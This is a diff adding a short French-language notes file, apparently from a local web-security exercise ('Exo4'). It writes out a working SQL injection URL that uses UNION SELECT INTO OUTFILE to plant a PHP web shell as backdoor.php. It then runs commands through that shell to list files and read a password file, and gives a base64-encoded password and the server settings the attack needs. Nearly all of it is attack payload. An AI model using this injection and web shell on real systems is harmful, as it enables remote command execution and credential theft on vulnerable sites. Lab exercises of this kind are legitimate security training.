@@ -1,0 +1,12 @@
+
+http://localhost/Exo4/?projet=-1 UNION SELECT null,'<?php if(!empty(\$_GET["c"])){ echo "<pre>".shell_exec(\$_GET["c"])."</pre>"; } ?>',null,null INTO OUTFILE '/var/www/html/Exo4/backdoor.php'
+
+http://localhost/Exo4/backdoor.php?c=ls -la
+
+http://localhost/Exo4/backdoor.php?c=cat psswd.txt
+
+TW9uIG1vdCBkZSBwYXNzZSBwb3VyIHRvdXMgbWVzIGNvbXB0ZXMgZXN0ICdiaWJpbnltb3VzJy4=
+
+#A décoder en base64...
+
+#Pour que l'attaque marche il faut desactiver l'option secure_file_priv, que l'utilisateur ait les droits d'écritures et ait le droit d'accéder au dossier
